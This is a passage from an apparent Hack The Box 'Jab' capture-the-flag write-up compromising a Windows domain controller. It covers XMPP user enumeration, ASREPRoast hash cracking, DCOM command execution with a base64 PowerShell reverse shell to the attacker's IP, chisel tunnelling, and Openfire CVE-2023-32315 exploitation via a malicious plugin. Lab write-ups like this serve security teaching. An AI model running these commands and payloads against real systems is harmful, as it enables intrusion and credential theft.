+| socks-auth-info: 
+|_  No authentication
+9389/tcp  open  mc-nmf              .NET Message Framing
+9999/tcp  open  nagios-nsca         Nagios NSCA
+47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc               Microsoft Windows RPC
+49665/tcp open  msrpc               Microsoft Windows RPC
+49666/tcp open  msrpc               Microsoft Windows RPC
+49667/tcp open  msrpc               Microsoft Windows RPC
+49673/tcp open  msrpc               Microsoft Windows RPC
+49690/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+49691/tcp open  msrpc               Microsoft Windows RPC
+49694/tcp open  msrpc               Microsoft Windows RPC
+49701/tcp open  msrpc               Microsoft Windows RPC
+49716/tcp open  msrpc               Microsoft Windows RPC
+49775/tcp open  msrpc               Microsoft Windows RPC
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5222-TCP:V=7.94SVN%I=7%D=4/15%Time=661D5D55%P=x86_64-pc-linux-gnu%r
+SF:(RPCCheck,9B,"&lt;stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
+SF:g/streams\"&gt;&lt;not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
+SF:eams\"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port7070-TCP:V=7.94SVN%I=7%D=4/15%Time=661D5D41%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x
+SF:202024\x2017:00:47\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20202
+SF:2\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x2
+SF:0bytes\r\nContent-Length:\x20223\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;&lt;title&gt;Op
+SF:enfire\x20HTTP\x20Binding\x20Service&lt;/title&gt;&lt;/head&gt;\n\x20\x20&lt;body&gt;&lt;fon
+SF:t\x20face=\"Arial,\x20Helvetica\"&gt;&lt;b&gt;Openfire\x20&lt;a\x20href=\"http://ww
+SF:w\.xmpp\.org/extensions/xep-0124\.html\"&gt;HTTP\x20Binding&lt;/a&gt;\x20Service
+SF:&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20U
+SF:nknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
+SF:ontent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\
+SF:x20505&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;")%r(HTTPOptions,56,
+SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x202024\x2017:00:
+SF:52\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"H
+SF:TTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\
+SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:
+SF:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\
+SF:x20character\x20OTEXT=0x80&lt;/pre&gt;")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1
+SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
+SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
+SF:r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20charact
+SF:er\x20CNTL=0x0&lt;/pre&gt;")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Il
+SF:legal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=is
+SF:o-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Ba
+SF:d\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x
+SF:0&lt;/pre&gt;")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20
+SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x2
+SF:0close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/
+SF:pre&gt;")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20
+SF:CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-L
+SF:ength:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/
+SF:h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=4/15%Time=661D5D4D%P=x86_64-pc-linux
+SF:-gnu%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x2
+SF:0Apr\x202024\x2017:00:59\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\
+SF:x202022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Rang
+SF:es:\x20bytes\r\nContent-Length:\x20223\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;&lt;ti
+SF:tle&gt;Openfire\x20HTTP\x20Binding\x20Service&lt;/title&gt;&lt;/head&gt;\n\x20\x20&lt;bod
+SF:y&gt;&lt;font\x20face=\"Arial,\x20Helvetica\"&gt;&lt;b&gt;Openfire\x20&lt;a\x20href=\"htt
+SF:p://www\.xmpp\.org/extensions/xep-0124\.html\"&gt;HTTP\x20Binding&lt;/a&gt;\x20S
+SF:ervice&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;\n&lt;/html&gt;\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
+SF:0\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x202024\x2017:01:05\x20GMT\r\nAll
+SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x205
+SF:05\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
+SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20M
+SF:essage\x20505&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;")%r(RPCCheck
+SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
+SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
+SF:ction:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Il
+SF:legal\x20character\x20OTEXT=0x80&lt;/pre&gt;")%r(DNSVersionBindReqTCP,C3,"HTT
+SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
+SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
+SF:close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20c
+SF:haracter\x20CNTL=0x0&lt;/pre&gt;")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
+SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
+SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
+SF:&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20C
+SF:NTL=0x0&lt;/pre&gt;")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
+SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
+SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x2
+SF:0URI&lt;/pre&gt;")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
+SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
+SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x2
+SF:0400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;");
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-04-15T17:02:00
+|_  start_date: N/A
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Apr 15 19:02:15 2024 -- 1 IP address (1 host up) scanned in 107.72 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>It’s possible to see that there are configured the domains jab.htb and dc01.jab.htb, so we need to add this line to <code>/etc/hosts</code> for the system to locate where they are:</p>
+
+<pre><code class="language-bash">10.10.11.4 jab.htb dc01.jab.htb 
+</code></pre>
+
+<p>Also, it’s possible to see that we have active-directory-related ports,  which are:</p>
+<ul>
+  <li>88, 464 for Kerberos</li>
+  <li>135 and 593 for RPC</li>
+  <li>139, 445 for SMB</li>
+  <li>389, 636, 3268, 3269 for LDAP</li>
+  <li>5989 for WinRM</li>
+</ul>
+
+<p>Enumerating Active Directory doesn’t allow us to do anything, but we also have some ports related to <a href="https://xmpp.org/">XMPP messaging service</a> which are 5222, 5223, 5262, 5263, 5269, 5270, 5275, 5276, 7070, 7443, 7777.</p>
+    
+      <h1 id="xmpp-enumeration">
+        
+        
+          XMPP enumeration <a href="#xmpp-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Searching for XMPP pentesting, I found <a href="https://bishopfox.com/blog/xmpp-underappreciated-attack-surface">this article</a> that talks about how we can enumerate usernames using <a href="https://pidgin.im/install/">pidgin client</a>. I will replicate it by running pidgin with <code>pidgin -d | tee xmpp_output.txt</code> (to enter in debug mode and see all information in a file for later filter users more easily), registering an account and going to <code>Accounts &gt; [my created accounts@jab.htb] &gt; search for users &gt; search.jab.htb (as its suggested) &gt; enter * for searching all usernames</code>. Now we can filter for all the usernames and retrieve them into a file by using this command:</p>
+
+<pre><code class="language-bash">❯ grep -Po '(?&lt;=&lt;field var="Username"&gt;&lt;value&gt;).*?(?=&lt;/value&gt;&lt;/field&gt;)' xmpp_output.txt &gt; users.txt
+</code></pre>
+    
+      <h1 id="access-as-svc_openfire">
+        
+        
+          Access as svc_openfire <a href="#access-as-svc_openfire" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Now that we have a comprehensive list of usernames, we can try making a ASRepRoast attack to retrieve a TGT hash for later cracking it offline. Doing this, we can see three users that retrieves hashes:</p>
+
+<pre><code class="language-bash">❯ GetNPUsers.py -no-pass -usersfile users.txt jab.htb/ -o asrep.hashes
+&lt;SNIP&gt;
+❯ cat asrep.hashes
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: asrep.hashes
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ $krb5asrep$23$jmontgomery@JAB.HTB:5eae5000d1ba1230b5d78b2f65924325$34d0461e31a87430d30eb11a8d5b41a64506d9f9c3e4ad43640f58995a066ab0d1a905aac71e903a043cc4126efacc22258e1de2304b
+       │ 1e4f6c4eb9c4140cdef1a4e8951b39cb8c5dac97ed066f8b9558408f34e65905f8e6f6c82412c94f5adc4c3bdf2e9a65e58d5da22d9e729f8866f33c3478bee0ea44cdf92c6a69aba56384c72bbb2dfc3eeb133e4c54159
+       │ c4948857f75617ee3578ab1cbdfd3dcbd509782a73e26758d66392d60267dcaf5b2fd6cd3c010f1a4f92294408dacbf84724b59125c87ec5d2077d55089b4d19d709f4fb3f23633be8372f8c784073ff11fdcd106
+   2   │ $krb5asrep$23$lbradford@JAB.HTB:9400ff54a014aa27b01aeb33c577c783$818b612f71ab30653444208ce3ddf9edeed7f8120eecb3a007f1f1290f5d650254be985f9a1c1ef70125be84e24e076559737bf0673687
+       │ 39425e917f469e27d9319ab2e48ac179c69354991767622bed2ffcd97c77e9ec21d74225b70985cac7f93d0de00b8ffd714d684a2e4bc74e0c6b869d9a7c087af354b45c41cf0eb44067786d89c39cf4bd908d318d78772
+       │ ce4e3c50f58f287b9103bbfdcc65c870d38de1d009d525d7574bd1bef078993e72d94a51cb72bf2f5f12c3702b6b83f20ba9fe58d767c62c3bc0a347e70d6f28237bd80db05b5a66f2d3e1fd1fad673fc8ed6e6
+   3   │ $krb5asrep$23$mlowe@JAB.HTB:2368c98d85fa02fb791c418b03bc4028$d866aa5e09c13aa57d8a1507085faccb3d589de266dbb82421084b3d31972c2e81e27b8a5b0bb89dda6e6b61344f40991582b3537f4d85497f
+       │ 8f24e01c3d66b922ae37765328b96c5374bc022434624a6a6f83cd1864cd6d767b3500ef6511c7ce9e03a0cb46baae891bc1529194867119dbfb46d694b51d58c9fe45b98f20c24d9ec3ee10dbcc087e5e6a54d7b8d2552
+       │ 6bf2ca01bdbd1b40931a30fc327aa01c2f39bb30a3bb2ce644a7f08af7a59083e2f4341537ada8e58bec47c5e8036b5694430939316eb567cacbff9e966170f8313ba782a1439c6f62b555820b6c3c01948
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+
+<p>Cracking it, it’s possible to see that only user jmontgomery has a password inside rockyou.txt:</p>
+
+<pre><code class="language-bash">❯ john -w=/usr/share/wordlists/rockyou.txt asrep.hashes
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Midnight_121     ($krb5asrep$23$jmontgomery@JAB.HTB)     
+1g 0:00:00:26 DONE (2024-06-28 21:56) 0.03831g/s 549569p/s 1513Kc/s 1513KC/s !!12Honey..*7¡Vamos!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+
+<p>With this password, I have tested and isn’t possible to do anything interesting related to active directory. But we still have XMPP, and reusing this credential and looking at messages (going to Buddies &gt; Join a chat &gt; Room List and selecting jmontgomery account &gt; Get List), we can see a chat called pentest2003 which leaks a password for svc_openfire because it was shared during a pentest:</p>
+
+<p><img src="/assets/images/Jab/leaked_password_for_svc_openfire.png" alt="Leaked password of svc_openfire"></p>
+
+<p>But we still can’t use winrm or have nothing interesting:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.4 -u 'svc_openfire' -p '!@#$%^&amp;*(1qazxsw' --shares
+SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&amp;*(1qazxsw
+SMB         10.10.11.4      445    DC01             [*] Enumerated shares
+SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
+SMB         10.10.11.4      445    DC01             -----           -----------     ------
+SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.4      445    DC01             C$                              Default share
+SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.4      445    DC01             SYSVOL          READ            Logon server share
+</code></pre>
+<pre><code class="language-bash">❯ netexec winrm 10.10.11.4 -u 'svc_openfire' -p '!@#$%^&amp;*(1qazxsw'
+WINRM       10.10.11.4      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:jab.htb)
+WINRM       10.10.11.4      5985   DC01             [-] jab.htb\svc_openfire:!@#$%^&amp;*(1qazxsw
+</code></pre>
+
+<p>However, we can view users info using bloodhound since we have valid creds that work for LDAP. Using bloodhound-python to retrieve all info and uploading that zip file to bloodhound, we can see that svc_openfire has ExecuteDCOM privilege in jab.htb:</p>
+
+<pre><code class="language-bash">❯ bloodhound-python -d jab.htb -u jmontgomery -p 'Midnight_121' -ns 10.10.11.4 -c All --zip
+</code></pre>
+
+<p>Remember to mark as owned the owned users we have (in this case jmontgomery and svc_openfire)</p>
+
+<p><img src="/assets/images/Jab/mark-jmontgomery-as-owned.png" alt="Mark user jmontgomery as owned"></p>
+
+<p><img src="/assets/images/Jab/mark-svc_openfire-as-owned.png" alt="Mark user svc_openfire as owned"></p>
+
+<p>Now, looking at “Shortest path from owned principals &gt; svc_openfire”, we can see that svc_openfire has ExecuteDCOM privilege in the DC, which allows executing commands because it belongs to the “Distributed COM Users local” group:</p>
+
+<p><img src="/assets/images/Jab/executedcom-privilege-svc_openfire.png" alt="ExecuteDCOM privilege of svc_openfire"></p>
+
+<p>So we can use dcomexec.py to execute a command, we can confirm it by doing a ping to our IP:</p>
+
+<pre><code class="language-bash">❯ dcomexec.py -object MMC20 -silentcommand 'jab.htb'/'svc_openfire':'!@#$%^&amp;*(1qazxsw'@10.10.11.4 'ping -n 1 10.10.14.53'
+</code></pre>
+
+<ul>
+  <li>-silentcommand: to hide the output of the command (since it doesn’t works)</li>
+</ul>
+
+<p>And we receive the ICMP packet:</p>
+
+<pre><code class="language-bash">❯ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+18:39:30.321644 IP jab.htb &gt; kali: ICMP echo request, id 1, seq 72, length 40
+18:39:30.321690 IP kali &gt; jab.htb: ICMP echo reply, id 1, seq 72, length 40
+</code></pre>
+
+<p>Now that we have confirmed we have command execution I will use “Powershell #3 (Base64)” payload from <a href="https://revshells.com">revshells</a> to receive a powershell shell. For that I will need to create a nc listener and put the command in dcomexec.py</p>
+
+<p><strong>NC listener</strong>:</p>
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><strong>RCE command</strong>:</p>
+<pre><code class="language-bash">❯ dcomexec.py -object MMC20 -silentcommand 'jab.htb'/'svc_openfire':'!@#$%^&amp;*(1qazxsw'@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
+</code></pre>
+
+<p>Now we have a shell received as svc_openfire:</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.11.4] 61537
+
+PS C:\windows\system32&gt; whoami
+jab\svc_openfire
+</code></pre>
+
+<p>And we can see user.txt:</p>
+
+<pre><code class="language-powershell">PS C:\Users\svc_openfire\Desktop&gt; type user.txt
+fa****************************d7
+</code></pre>
+    
+      <h1 id="privilege-escalation-to-administrator">
+        
+        
+          Privilege escalation to Administrator <a href="#privilege-escalation-to-administrator" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Looking at internal ports running, we can see ports 9090 and 9091:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; netstat -ano | findstr LISTEN
+&lt;SNIP&gt;
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2888
+  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3248
+  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3248
+&lt;SNIP&gt;
+</code></pre>
+
+<p>I will forward it to my machine using <a href="https://github.com/jpillora/chisel/releases/tag/v1.9.1">chisel</a> that I need to download it from my HTTP server and place it in a temp folder directory (C:\Windows\Temp\privesc) that is always a good practice to be anonymous:</p>
+
+<p><strong>Download chisel from its repository and create HTTP server</strong></p>
+<pre><code class="language-bash"># Chisel for windows
+❯ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
+❯ mv chisel_1.9.1_windows_amd64.gz chisel.exe.gz
+❯ gzip -d chisel.exe.gz
+# Chisel for linux (for the server)
+❯ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+❯ mv chisel_1.9.1_linux_amd64.gz chisel.gz
+❯ gzip -d chisel.gz
+# Show files and create HTTP server
+❯ ls; python3 -m http.server 80
+chisel chisel.exe
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p><strong>Create chisel server to receive connections</strong>:</p>
+<pre><code class="language-bash">❯ ./chisel server -p 1234 --reverse
+2024/07/04 19:21:20 server: Reverse tunnelling enabled
+2024/07/04 19:21:20 server: Fingerprint sjhwVRpFj/C0QHInjMKpXA+nzV3J6pvqR8kcj9MPe1o=
+2024/07/04 19:21:20 server: Listening on http://0.0.0.0:1234
+</code></pre>
+
+<p><strong>Download chisel for windows from your HTTP server and execute it in client mode to forward port 9090 and 9091 to your machine</strong>:</p>
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; certutil.exe -f -urlcache -split http://10.10.14.53/chisel.exe
+****  Online  ****
+  000000  ...
+  896c00
+CertUtil: -URLCache command completed successfully.
+PS C:\Windows\Temp\privesc&gt; .\chisel.exe client 10.10.14.53:1234 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
+</code></pre>
+
+<p>We receive the connection in the chisel server:</p>
+
+<pre><code class="language-plaintext">2024/07/04 19:23:47 server: session#1: tun: proxy#R:9090=&gt;9090: Listening
+2024/07/04 19:23:47 server: session#1: tun: proxy#R:9091=&gt;9091: Listening
+</code></pre>
+
+<p>Looking at what this ports are related to, we can see that it’s for openfire administration console version 4.7.5:</p>
+
+<p><img src="/assets/images/Jab/openfire-v4.7.5.png" alt="Openfire administration console v4.7.5"></p>
+
+<p>Trying to reuse the credentials of svc_openfire works and we can access the panel:</p>
+
+<p><img src="/assets/images/Jab/access-openfire-panel.png" alt="Access openfire panel"></p>
+
+<p>Searching for vulnerabilities we end up with <a href="https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce">this post</a> that talks about using a path traversal vulnerability to create a new user and have administrator access for later uploading a malicious plugin that allow executing commands. However, we already have credentials and we only have to upload the vulnerable plugin. The post also gives us a <a href="https://github.com/miko550/CVE-2023-32315">link</a> to download the malicious plugin, so I will download it and upload to execute commands. For this go to Plugins &gt; (upload the plugin):</p>
+
+<p><img src="/assets/images/Jab/upload-malicious-plugin.png" alt="Upload malicious plugin"></p>
+
+<p>Now, go to Server &gt; Server settings and select Management Tool (which is the malicious plugin), enter the password 123 (as said in the post) and we can see we are Administrator user:</p>
+
+<p><img src="/assets/images/Jab/management-tool-openfire.png" alt="Openfire malicious Management Tool"></p>
+
+<p><img src="/assets/images/Jab/we-are-administrator-openfire.png" alt="We are administrator"></p>
+
+<p>The only thing we have left is execute a command that gives us a reverse shell, so I will use the same “Powershell #3 Base64” payload of <a href="https://revshells.com">revshells</a> after spawning a nc listener:</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><img src="/assets/images/Jab/powershell-encoded-openfire.png" alt="Powershell encoded command executed in openfire"></p>
+
+<p>We finally received the Administrator shell and we can see root.txt:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Openfire\bin&gt; cd \Users\administrator\Desktop
+PS C:\Users\administrator\Desktop&gt; type root.txt
+e8****************************4e
+</code></pre>
+
+<p>That’s the machine guys, hope you liked it :).</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>28 June 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=xmpp" class="tag" style="font-family: 'Cascadia Code';">xmpp</a>
+    
+    <a href="/search?q=xmpp-user-enumeration" class="tag" style="font-family: 'Cascadia Code';">xmpp-user-enumeration</a>
+    
+    <a href="/search?q=asreproast" class="tag" style="font-family: 'Cascadia Code';">asreproast</a>
+    
+    <a href="/search?q=hash-cracking" class="tag" style="font-family: 'Cascadia Code';">hash-cracking</a>
+    
+    <a href="/search?q=executedcom" class="tag" style="font-family: 'Cascadia Code';">executedcom</a>
+    
+    <a href="/search?q=dcomexec.py" class="tag" style="font-family: 'Cascadia Code';">dcomexec.py</a>
+    
+    <a href="/search?q=openfire-rce" class="tag" style="font-family: 'Cascadia Code';">openfire-rce</a>
+    
+    <a href="/search?q=CVE-2023-32315" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-32315</a>
+    
+    
+</div>
+  <br>
+  Share this writeup: 
+  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Jab.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Jab.html&amp;text=Writeup+for+HTB%20Jab%20writeup+from+HTB+held+on+28%20June%202024&amp;hashtags=ctf,writeup,Jab,HTB,xmpp,xmpp-user-enumeration,asreproast,hash-cracking,executedcom,dcomexec.py,openfire-rce,CVE-2023-32315','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
